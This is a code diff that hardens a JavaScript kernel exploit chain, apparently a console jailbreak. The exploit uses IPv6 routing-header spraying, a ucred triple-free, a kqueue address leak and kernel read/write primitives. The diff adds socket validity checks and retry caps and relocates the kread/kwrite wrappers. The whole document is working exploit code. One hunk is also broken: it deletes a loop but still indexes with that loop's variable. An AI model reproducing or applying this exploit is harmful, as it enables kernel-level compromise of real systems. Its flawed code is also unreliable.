@@ -959,10 +959,20 @@ function setup() {
   iov_sock_1 = read32(iov_sock.add(4));
 
   // Create ipv6 sockets
-  for (var _i8 = 0; _i8 < ipv6_socks.length; _i8++) {
-    ipv6_socks[_i8] = socket(AF_INET6, SOCK_STREAM, 0);
+  var s = socket(AF_INET6, SOCK_STREAM, 0);
+  if (!s || s.eq(BigInt_Error)) {
+    log('[SETUP] Failed to create ipv6 socket at index ' + _i8);
+    ipv6_socks[_i8] = new BigInt(0); // قيمة آمنة
+  } else {
+    ipv6_socks[_i8] = s;
   }
-
+  for (var i = 0; i < ipv6_socks.length; i++) {
+    var sd = ipv6_socks[i];
+    if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
+      continue; // skip safely
+    }
+    free_rthdr(sd);
+  }
   // Initialize pktopts
   free_rthdrs(ipv6_socks);
 
@@ -1182,7 +1192,15 @@ function find_triplet(master, other) {
         continue;
       }
       write32(spray_add, RTHDR_TAG | i);
+      var sd = ipv6_socks[i];
+      if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
+        continue;
+      }
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+    }
+    var master_sd = ipv6_socks[master];
+    if (!master_sd || master_sd.eq(BigInt_Error) || master_sd.eq(new BigInt(0))) {
+      return -1;
     }
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
     val = read32(leak_add);
@@ -1241,7 +1259,11 @@ function trigger_ucred_triplefree() {
       continue;
     }
     log('[TRIPLE] Twins found, starting triple free');
-
+    var sd = ipv6_socks[twins[1]];
+    if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
+      log('[TRIPLE] invalid socket in twins[1]');
+      return false;
+    }
     // Free one
     free_rthdr(ipv6_socks[twins[1]]);
     var count = 0;
@@ -1303,8 +1325,17 @@ function leak_kqueue() {
   log('[LEAK] Enter leak_kqueue');
   log('[LEAK] Starting kqueue leak phase');
 
+  // تأمين triplets[1] قبل free_rthdr
+  var sd1 = ipv6_socks[triplets[1]];
+  var sd0 = ipv6_socks[triplets[0]];
+  if (!sd1 || sd1.eq(BigInt_Error) || sd1.eq(new BigInt(0)) ||
+      !sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
+    log('[LEAK] Invalid triplet sockets in leak_kqueue, aborting leak');
+    return false;
+  }
+
   // Free one.
-  free_rthdr(ipv6_socks[triplets[1]]);
+  free_rthdr(sd1);
 
   // Leak kqueue.
   var kq = new BigInt(0);
@@ -1319,6 +1350,11 @@ function leak_kqueue() {
       watchdog_tick('leak_kqueue_loop');
     }
     kq = kqueue();
+    var sd0 = ipv6_socks[triplets[0]];
+    if (!sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
+      log('[LEAK] triplets[0] socket became invalid during loop');
+      return false;
+    }
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
     var cur_magic = read64(magic_add);
     var cur_fdp = read64(leak_rthdr.add(0x98));
@@ -1327,7 +1363,9 @@ function leak_kqueue() {
       log('[LEAK] Pattern matched, breaking loop');
       break;
     }
-    close(kq);
+    if (kq && !kq.eq(BigInt_Error)) {
+      close(kq);
+    }
     sched_yield();
     count++;
   }
@@ -1344,7 +1382,9 @@ function leak_kqueue() {
   log('[LEAK] kq_fdp=' + hex(kq_fdp) + ' kl_lock=' + hex(kl_lock));
 
   // Close kqueue to free buffer.
-  close(kq);
+  if (kq && !kq.eq(BigInt_Error)) {
+    close(kq);
+  }
 
   // Find new triplets[1]
   triplets[1] = find_triplet(triplets[0], triplets[2]);
@@ -1572,6 +1612,12 @@ function kwriteslow(addr, buffer, size) {
     }
 
     count++;
+
+    if (count > 10000) {
+      log('[KW] Stage1 failed after max iterations');
+      return BigInt_Error;
+    }
+
     trigger_uio_readv();
     sched_yield();
 
@@ -1611,6 +1657,12 @@ function kwriteslow(addr, buffer, size) {
     }
 
     count2++;
+
+    if (count2 > 10000) {
+      log('[KW] Stage2 failed after max iterations');
+      return BigInt_Error;
+    }
+
     trigger_iov_recvmsg();
     sched_yield();
 
@@ -1643,6 +1695,42 @@ function kwriteslow(addr, buffer, size) {
   }
 
   return new BigInt(0);
+}
+/* ===========================
+  *   kread / kwrite wrappers
+  * =========================== */
+
+function kread64(addr) {
+  return kreadslow64(addr);
+}
+function kread32(addr) {
+  var buf = kreadslow(addr, 4);
+  if (buf.eq(BigInt_Error)) {
+    log('[KR] kread32 failed at addr: ' + hex(addr));
+    // نرجّع قيمة مميزة (مثلاً 0) ونسيب اللي فوق يقرّر
+    return 0;
+  }
+  return read32(buf);
+}
+function kwrite64(addr, val) {
+  var buf = malloc(8);
+  write64(buf, val);
+  var ret = kwriteslow(addr, buf, 8);
+  if (ret.eq(BigInt_Error)) {
+    log('[KW] kwrite64 failed at addr: ' + hex(addr) + ' val: ' + hex(val));
+    return false;
+  }
+  return true;
+}
+function kwrite32(addr, val) {
+  var buf = malloc(4);
+  write32(buf, val);
+  var ret = kwriteslow(addr, buf, 4);
+  if (ret.eq(BigInt_Error)) {
+    log('[KW] kwrite32 failed at addr: ' + hex(addr) + ' val: ' + val);
+    return false;
+  }
+  return true;
 }
 /* ===========================
   *   Arbitrary Kernel R/W Setup
@@ -1742,42 +1830,7 @@ function setup_arbitrary_rw() {
   log('[RW] setup_arbitrary_rw: success');
   return true;
 }
-/* ===========================
-  *   kread / kwrite wrappers
-  * =========================== */
 
-function kread64(addr) {
-  return kreadslow64(addr);
-}
-function kread32(addr) {
-  var buf = kreadslow(addr, 4);
-  if (buf.eq(BigInt_Error)) {
-    log('[KR] kread32 failed at addr: ' + hex(addr));
-    // نرجّع قيمة مميزة (مثلاً 0) ونسيب اللي فوق يقرّر
-    return 0;
-  }
-  return read32(buf);
-}
-function kwrite64(addr, val) {
-  var buf = malloc(8);
-  write64(buf, val);
-  var ret = kwriteslow(addr, buf, 8);
-  if (ret.eq(BigInt_Error)) {
-    log('[KW] kwrite64 failed at addr: ' + hex(addr) + ' val: ' + hex(val));
-    return false;
-  }
-  return true;
-}
-function kwrite32(addr, val) {
-  var buf = malloc(4);
-  write32(buf, val);
-  var ret = kwriteslow(addr, buf, 4);
-  if (ret.eq(BigInt_Error)) {
-    log('[KW] kwrite32 failed at addr: ' + hex(addr) + ' val: ' + val);
-    return false;
-  }
-  return true;
-}
 /* ===========================
   *   Jailbreak
   * ===========================
